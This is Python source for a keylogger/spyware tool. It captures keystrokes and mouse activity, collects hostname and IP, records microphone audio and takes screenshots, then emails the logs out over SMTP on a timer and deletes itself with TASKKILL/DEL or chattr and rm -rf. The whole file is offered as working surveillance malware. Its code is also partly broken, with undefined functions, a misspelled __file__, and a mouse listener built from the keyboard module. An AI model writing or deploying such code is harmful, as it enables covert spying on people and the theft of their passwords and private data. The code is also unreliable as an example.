import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from email.mime.text import MIMEText
import logging
import yagmail
import time
import pyaudio
from PIL import ImageGrab

try:
    import logging
    import pyscreenshot
    import sounddevice as sd
    import pynput
except ModuleNotFoundError:
    modules = ["pynput", "pyscreenshot", "sounddevice"]
    install_modules(modules)


def install_modules(modules):
    call("pip install " + ' '.join(modules), shell=True)


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.init_logging()

    def init_logging(self):
        logging.basicConfig(filename="keylogger.log", level=logging.DEBUG)

    def appendlog(self, string):
        logging.info(string)

    def on_move(self, x, y):
        self.appendlog(f"Mouse moved to {x}, {y}\n")

    def on_click(self, x, y):
        self.appendlog(f"Mouse clicked at {x}, {y}\n")

    def on_scroll(self, x, y):
        self.appendlog(f"Mouse scrolled at {x}, {y}\n")

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" {key} "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        yag = yagmail.SMTP(email, password, host="smtp.mailtrap.io", port=2525)
        yag.send("Private Person <fromxyz@example.com>", "A Test User <tozyx@example.com>", message)

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Thread(target=self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        self.appendlog(f"Hostname: {hostname}\n")
        self.appendlog(f"IP: {ip}\n")
        self.appendlog(f"Processor: {plat}\n")
        self.appendlog(f"System: {system}\n")
        self.appendlog(f"Machine: {machine}\n")

    def microphone(self):
        p = pyaudio.PyAudio()
        fs = 44100
        seconds = self.interval
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=fs, frames_per_buffer=1024, input=True)

        audio_data = []
        for i in range(0, int(fs * seconds)):
            data = stream.read(1024)
            audio_data.append(data)

        stream.stop_stream()
        stream.close()

        wf = wave.open('sound.wav', 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(fs)
        wf.writeframes(b''.join(audio_data))
        wf.close()

        self.send_mail(email=self.email, password=self.password, message="sound.wav")

    def screenshot(self):
        img = ImageGrab.grab()
        img.save("screenshot.png")
        self.send_mail(email=self.email, password=self.password, message="screenshot.png")

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()

        mouse_listener = keyboard.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
        mouse_listener.start()

        self.report()
        self.system_information()
        self.microphone()
        self.screenshot()

        time.sleep(self.interval)

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system(f"cd {pwd}")
                os.system(f"TASKKILL /F /IM {os.path.basename(_file_)}")
                print('File was closed.')
                os.system(f"DEL {os.path.basename(_file_)}")
            except OSError:
                print('File is close.')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system(f"cd {pwd}")
                os.system('pkill leafpad')
                os.system(f"chattr -i {os.path.basename(_file_)}")
                print('File was closed.')
                os.system(f"rm -rf {os.path.basename(_file_)}")
            except OSError:
                print('File is close.')


if __name__ == "__main__":
    import getpass

    EMAIL_ADDRESS = input("Enter your email address: ")
    EMAIL_PASSWORD = getpass.getpass("Enter your email password: ")
    SEND_REPORT_EVERY = int(input("Enter the interval in seconds between sending reports: "))
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
